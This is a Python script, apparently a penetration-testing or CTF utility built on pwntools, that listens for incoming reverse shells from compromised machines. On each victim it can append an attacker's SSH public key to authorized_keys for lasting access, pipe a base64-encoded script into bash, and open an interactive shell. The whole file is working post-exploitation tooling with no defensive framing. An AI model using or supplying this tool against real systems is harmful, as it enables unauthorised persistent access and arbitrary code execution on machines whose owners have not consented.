#!/usr/bin/env python3
import argparse
import pwnlib
from pwn import listen
from base64 import b64encode


class ReverseShellHelper:
    def __init__(self, host, port):
        self.shell = listen(bindaddr=host, port=port)

    def wait(self):
        self.shell.wait_for_connection()

    def get_output(self, command):
        self.shell.sendline(command)
        return self.shell.recvuntil('\n', drop=True).decode()

    def add_key(self, key):
        self.shell.sendline('mkdir -p $HOME/.ssh')
        self.shell.sendline(f'grep "{key}" $HOME/.ssh/authorized_keys ' +
                            '2>/dev/null || ' +
                            f'echo "{key}" >> $HOME/.ssh/authorized_keys')

    def run_script(self, script):
        encoded_script = b64encode(script.encode()).decode()
        self.shell.sendline(f'echo {encoded_script} | base64 -d | bash')

    def interact(self):
        user = self.get_output('whoami')
        host = self.get_output('hostname')
        prompt = pwnlib.term.text.bold_red(f'{user}@{host}') + '$ '
        self.shell.interactive(prompt=prompt)


def main():
    parser = argparse.ArgumentParser(description='Reverse shell helper')
    parser.add_argument('-i', dest='host', type=str, default='0.0.0.0',
                        help='The IP to listen on')
    parser.add_argument('-p', dest='port', type=int, default=1337,
                        help='The port to listen on')
    parser.add_argument('-s', dest='script', type=str, default=None,
                        help='A script to execute')
    parser.add_argument('-k', dest='key', type=str, default=None,
                        help='Public key to add to authorized file')
    args = parser.parse_args()

    handler = ReverseShellHelper(args.host, args.port)

    if args.key:
        pub_key = open(args.key, 'r').read()
        if 'PRIVATE' not in pub_key:
            handler.add_key(pub_key)
        else:
            print('You are trying to add a private key, aborting.')

    if args.script:
        script = open(args.script, 'r').read()
        handler.run_script(script)

    handler.wait()
    handler.interact()


if __name__ == '__main__':
    main()
